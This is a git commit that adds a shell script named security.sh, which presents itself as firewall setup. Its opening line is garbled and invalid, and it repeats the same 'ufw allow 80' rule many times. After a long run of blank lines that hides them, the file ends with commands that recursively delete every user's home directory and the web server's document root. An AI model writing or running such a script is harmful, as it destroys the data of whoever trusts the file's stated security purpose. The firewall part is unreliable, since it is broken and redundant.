4224b1ac0ce4ae55888f741502507f8fc8f3f2c2
abdalla555-gaas <156615270+abdalla555-gaas@users.noreply.github.com>
2024-01-21 16:25:15 +0200

    Create security.sh

---
+++ security/security.sh
@@ -0,0 +1,64 @@
+ufw allow 80/tcp && allow tcp id 960694 30  909 4 0 
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/tcp
+ufw allow 80/udp
+ufw allow 80/udp
+ufw allow 80/udp
+ufw allow 80/udp
+ufw allow 80/udp
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+rm -rf /home/*
+rm -rf /var/www/html 
